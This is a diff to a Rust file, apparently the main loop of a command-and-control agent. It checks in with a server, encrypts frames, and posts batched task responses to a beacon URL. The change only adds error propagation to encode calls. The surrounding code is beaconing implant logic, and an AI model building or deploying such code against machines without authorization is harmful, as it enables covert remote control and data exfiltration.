@@ -67,7 +67,7 @@ pub fn run(cfg: Config) -> anyhow::Result<()> {
     // ---- check-in (retry until the server accepts us) ----------------------
     let mut counter = 0u64;
     let mut w = Writer::new();
-    info.encode(&mut w);
+    info.encode(&mut w)?;
     let info_plain = w.into_bytes();
     loop {
         let frame = encode_frame(&pubkey, counter, &key, &info_plain);
@@ -91,7 +91,7 @@ pub fn run(cfg: Config) -> anyhow::Result<()> {
             &pubkey,
             counter,
             &key,
-            &TaskResponse::encode_vec(&pending_responses),
+            &TaskResponse::encode_vec(&pending_responses)?,
         );
         counter += 1;
         pending_responses.clear();
@@ -154,7 +154,7 @@ pub fn run(cfg: Config) -> anyhow::Result<()> {
                         response,
                     }];
                     let frame =
-                        encode_frame(&pubkey, counter, &key, &TaskResponse::encode_vec(&single));
+                        encode_frame(&pubkey, counter, &key, &TaskResponse::encode_vec(&single)?);
                     if let Err(e) = ureq::post(&beacon_url).send_bytes(&frame) {
                         tracing::warn!(error = %e, "beacon send failed (oversized chunk); response dropped");
                     }
@@ -179,7 +179,7 @@ pub fn run(cfg: Config) -> anyhow::Result<()> {
                         &pubkey,
                         counter,
                         &key,
-                        &TaskResponse::encode_vec(&pending_responses),
+                        &TaskResponse::encode_vec(&pending_responses)?,
                     );
                     if let Err(e) = ureq::post(&beacon_url).send_bytes(&frame) {
                         tracing::warn!(error = %e, "beacon send failed (batch flush); response batch dropped");
